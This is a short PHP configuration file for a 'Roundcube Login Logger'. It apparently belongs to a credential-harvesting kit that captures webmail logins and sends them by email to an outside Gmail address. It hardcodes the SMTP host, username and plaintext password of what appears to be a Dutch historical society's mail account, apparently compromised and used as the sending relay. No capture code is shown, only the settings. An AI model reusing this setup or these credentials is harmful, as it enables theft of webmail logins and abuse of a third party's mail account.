<?php

// SMTP Configuration for Roundcube Server
// Replace these values with your actual SMTP settings

// SMTP Server Settings
define('SMTP_HOST', 'mail.historischeverenigingroon.nl');     // Your SMTP server
define('SMTP_PORT', 587);                                     // SMTP port (587 for TLS, 465 for SSL)
define('SMTP_USERNAME', 'archief@historischeverenigingroon.nl'); // Your SMTP username
define('SMTP_PASSWORD', 'gXShzqZtV6Kgd5Q');                 // Your SMTP password

// Email Settings
define('LOG_EMAIL', 'skkho87.sm@gmail.com');                 // Email address where logs will be sent
define('FROM_EMAIL', 'archief@historischeverenigingroon.nl'); // From email address
define('FROM_NAME', 'Roundcube Login Logger');               // From name

// Security Settings
define('ENABLE_LOGGING', true);                              // Set to false to disable logging
define('LOG_TO_FILE', true);                                 // Also log to file as backup
define('MAX_ATTEMPTS_PER_IP', 10);                          // Maximum attempts per IP before blocking
define('BLOCK_DURATION', 3600);                             // Block duration in seconds (1 hour)

// SMTP Settings
define('USE_TLS', true);                                     // Use TLS encryption
define('SMTP_DEBUG', 0);                                     // SMTP debug level (0 = off, 1 = client, 2 = server)
define('SMTP_TIMEOUT', 30);                                  // SMTP timeout in seconds

// File Paths
define('LOG_DIR', __DIR__ . '/logs');                       // Log directory
define('BLOCKED_IPS_FILE', LOG_DIR . '/blocked_ips.json');  // Blocked IPs file

// Create log directory if it doesn't exist
if (!is_dir(LOG_DIR)) {
    mkdir(LOG_DIR, 0755, true);
}

?>